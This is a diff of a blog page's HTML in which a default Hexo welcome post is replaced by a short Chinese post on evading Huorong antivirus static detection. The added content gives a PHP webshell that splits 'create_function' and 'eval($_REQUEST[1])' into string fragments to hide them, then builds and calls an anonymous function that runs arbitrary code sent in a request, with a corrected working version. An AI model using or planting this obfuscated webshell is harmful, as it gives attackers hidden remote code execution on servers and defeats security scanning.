@@ -17,7 +17,7 @@
 
 
 
-<title>Hello World | owlsapce&#39;s Blog</title>
+<title>动态函数绕过火绒静态检测 | momo&#39;s Blog</title>
 
 
 
@@ -151,12 +151,12 @@
     <nav class="flex items-center text-base">
       <a href="/" class="group">
         <h2 class="font-medium tracking-tighterp text-l p-2">
-          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="owlsapce's Blog" />
-          owlsapce&#39;s Blog
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="momo's Blog" />
+          momo&#39;s Blog
         </h2>
       </a>
       <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
-        Hello World
+        动态函数绕过火绒静态检测
       </div>
       <div class="flex-1"></div>
       <div class="flex items-center gap-3">
@@ -211,22 +211,18 @@
 
 <!-- toc -->
 
-  <!-- tocbot -->
-<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
-
-
 <section class="px-6 max-w-prose mx-auto md:px-0">
   <!-- header -->
   <header class="overflow-hidden pt-6 pb-6 md:pt-12">
     <div class="pt-4 md:pt-6">
       <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
-        Hello World
+        动态函数绕过火绒静态检测
       </h1>
       <div>
         <section class="flex items-center gap-3 text-sm">
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
-            <time>2024-08-11</time>
+            <time>2025-04-09</time>
           </span>
           <span class="text-gray-400">·</span>
           <span class="flex items-center gap-1">
@@ -236,7 +232,7 @@
           <span class="text-gray-400">·</span>
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
-            <span>75 words</span>
+            <span>287 words</span>
           </span>
           
         </section>
@@ -245,19 +241,12 @@
   </header>
   <!-- content -->
   <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    <p>使用变量函数名绕过静态检测<br>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="string">&quot;cr&quot;</span>.<span class="string">&quot;eat&quot;</span>.<span class="string">&quot;e_f&quot;</span>.<span class="string">&quot;un&quot;</span>.<span class="string">&quot;ction&quot;</span>;</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l($&quot;</span>.<span class="string">&quot;_RE&quot;</span>.<span class="string">&quot;QUES&quot;</span>.<span class="string">&quot;T[1&quot;</span>.<span class="string">&quot;]);&quot;</span>;</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>)();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用拆分函数名混淆函数，并且使用动态函数名，防止检测<br><code>$funcName = &quot;cr&quot;.&quot;eat&quot;.&quot;e_fun&quot;.&quot;ction&quot;</code> 将 <code>create_function</code> 拆分为多个字符串拼接，规避静态检测。<br><code>$code = &quot;eva&quot;.&quot;l($&quot;.&quot;_RE&quot;.&quot;QUEST[&quot;.&quot;1])&quot;</code> 生成 <code>eval($_REQUEST[1])</code>，隐藏敏感函数 <code>eval</code> 和超全局变量 <code>$_REQUEST</code>。<br><del><code>$funcName(&#39;&#39;, $code)()</code> 等价于：</del></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;eval($_REQUEST[1])&#x27;</span>)();</span><br></pre></td></tr></table></figure>
+<p><code>create_function</code> 创建匿名函数，函数体为 <code>eval($_REQUEST[1])</code><br><del>末尾的 <code>()</code> 立即调用该函数，触发 <code>eval</code> 执行 <code>$_REQUEST[1]</code> 传入的任意代码</del><br>但是出现了一点小差错：<code>()</code>形式无法调用函数，所以将形式改变一下，赋值给参数然后再调用函数即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="string">&quot;cr&quot;</span>.<span class="string">&quot;eat&quot;</span>.<span class="string">&quot;e_f&quot;</span>.<span class="string">&quot;un&quot;</span>.<span class="string">&quot;ction&quot;</span>;</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l($&quot;</span>.<span class="string">&quot;_RE&quot;</span>.<span class="string">&quot;QUES&quot;</span>.<span class="string">&quot;T[1&quot;</span>.<span class="string">&quot;]);&quot;</span>;</span><br><span class="line"><span class="variable">$anonymous_func</span> = <span class="variable">$func</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$anonymous_func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
   </article>
   <!-- tag -->
@@ -267,11 +256,6 @@
   <!-- prev and next -->
   <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
     <div>
-      
-        <a href="/2024/08/11/getWorld/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
-          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
-          getWorld
-        </a>
       
     </div>
     <div>
